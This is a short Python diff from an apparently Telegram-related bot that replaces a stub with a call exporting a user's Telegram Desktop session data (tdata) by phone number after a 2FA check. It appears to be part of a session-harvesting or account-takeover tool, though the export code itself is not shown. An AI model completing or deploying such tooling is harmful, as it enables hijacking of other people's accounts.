@@ -114,8 +114,8 @@ async def check_and_process_2fa(user_id):
             return
 
 async def generate_tdata(user_id, phone):
-    # TODO: генерация tdata через Telethon сессию
-    await asyncio.sleep(2)
+    from auth import export_tdata
+    await export_tdata(phone, BOT_TOKEN, user_id)
     await redis_set(f"tdata_ready:{user_id}", "ready", ex=600)
     if user_id in pending:
         del pending[user_id]
